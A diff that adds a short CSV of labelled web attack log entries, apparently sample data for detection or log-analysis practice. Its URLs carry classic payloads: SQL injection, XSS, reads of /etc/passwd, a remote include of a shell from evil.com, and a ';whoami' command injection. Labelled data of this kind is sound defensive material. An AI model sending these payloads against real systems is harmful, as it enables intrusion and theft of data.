@@ -1,0 +1,15 @@
+timestamp,source_ip,destination_ip,method,url,attack_type,status
+2026-04-08 10:01:12,192.168.1.10,10.0.0.5,GET,/login?id=1 OR 1=1--,SQL Injection,Attempt
+2026-04-08 10:02:45,192.168.1.11,10.0.0.5,GET,/search?q=<script>alert(1)</script>,XSS,Attempt
+2026-04-08 10:03:21,192.168.1.12,10.0.0.5,GET,/download?file=../../etc/passwd,Path Traversal,Attempt
+2026-04-08 10:04:55,192.168.1.13,10.0.0.5,GET,/index.php?page=../../etc/passwd,LFI,Attempt
+2026-04-08 10:05:30,192.168.1.14,10.0.0.5,GET,/index.php?page=http://evil.com/shell.php,RFI,Attempt
+2026-04-08 10:06:10,192.168.1.15,10.0.0.5,GET,/ping?ip=127.0.0.1;whoami,Command Injection,Attempt
+2026-04-08 10:07:05,192.168.1.16,10.0.0.5,GET,/fetch?url=http://127.0.0.1/admin,SSRF,Attempt
+2026-04-08 10:08:22,192.168.1.17,10.0.0.5,POST,/xml,XXE,Attempt
+2026-04-08 10:09:40,192.168.1.18,10.0.0.5,GET,/login?user=*)(|(user=*)),LDAP Injection,Attempt
+2026-04-08 10:10:12,192.168.1.19,10.0.0.5,GET,/page?name=abc%0d%0aSet-Cookie:malicious=true,Header Injection,Attempt
+2026-04-08 10:11:55,192.168.1.20,10.0.0.5,POST,/login,Brute Force,Attempt
+2026-04-08 10:12:30,192.168.1.21,10.0.0.5,POST,/transfer,CSRF,Attempt
+2026-04-08 10:13:10,192.168.1.22,10.0.0.5,GET,/api,DoS,Attempt
+2026-04-08 10:14:05,192.168.1.23,10.0.0.5,GET,/home,Normal,Safe
